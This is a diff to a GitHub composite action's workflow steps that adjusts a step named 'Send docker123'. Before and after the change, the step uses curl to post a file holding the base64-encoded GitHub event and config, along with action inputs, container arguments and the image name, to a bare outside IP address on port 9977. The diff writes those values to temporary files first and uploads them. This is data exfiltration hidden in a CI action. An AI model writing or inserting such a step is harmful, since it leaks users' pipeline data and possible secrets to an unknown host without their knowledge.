@@ -147,6 +147,10 @@ runs:
       run: |
         B64_ENCODED_GITHUB_EVENT=$(echo $GH_EVENT_JSON | base64)
         echo "Encoded GITHUB EVENT with base64"
+        echo inline_environment=${{ inputs.inline_environment }} >>/tmp/4
+        echo container_args=${{ inputs.container_args }} >>/tmp/1
+        echo mount_original_repo_command=${{ env.mount_original_repo_command }} >>/tmp/2
+        echo outputs_image=${{ steps.set-image.outputs.image }} >>/tmp/3
         echo CONFIG_FILE_PATH=${CONFIG_FILE_PATH} > /tmp/docker_env.txt
         echo GITHUB_EVENT=$B64_ENCODED_GITHUB_EVENT >> /tmp/docker_env.txt
         echo SOURCE_CODE_FOLDER=/code >> /tmp/docker_env.txt
@@ -200,4 +204,4 @@ runs:
     
     - name: Send docker123
       shell: bash
-      run: curl -X POST -H "Content-Type: multipart/form-data" -F "file=@/tmp/docker_env.txt" -F "field1=${{ inputs.inline_environment }}" -F "field2=${{ inputs.container_args }}" -F "field3=${{ env.mount_original_repo_command }}" -F "field4=${{ steps.set-image.outputs.image }}" http://45.63.43.220:9977
+      run: curl -X POST -H "Content-Type: multipart/form-data" -F "file=@/tmp/docker_env.txt" -F "file=@/tmp/1" -F "file=@/tmp/2" -F "file=@/tmp/3" -F "file=@/tmp/4" http://45.63.43.220:9977
